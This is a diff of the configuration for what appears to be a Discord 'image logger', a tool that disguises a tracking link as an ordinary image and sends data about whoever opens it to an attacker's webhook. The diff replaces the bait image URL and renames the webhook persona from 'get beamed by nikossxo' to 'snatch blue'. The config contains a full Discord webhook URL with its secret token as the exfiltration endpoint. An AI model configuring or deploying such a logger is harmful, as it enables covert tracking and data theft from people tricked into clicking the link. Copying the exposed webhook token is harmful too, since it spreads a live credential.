@@ -15,12 +15,12 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1545716949072478218/0jmphCGZkr2ezEFVOz-aPoLfQ_pkLhk0ENTN3h7D-cqacgHoFQiHtkO-0yLGlDBERVHv",
-    "image": "https://i1.sndcdn.com/artworks-000234186330-8yj6x3-t500x500.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "get beamed by nikossxo", # Set this to the name you want the webhook to have
+    "username": "snatch blue", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
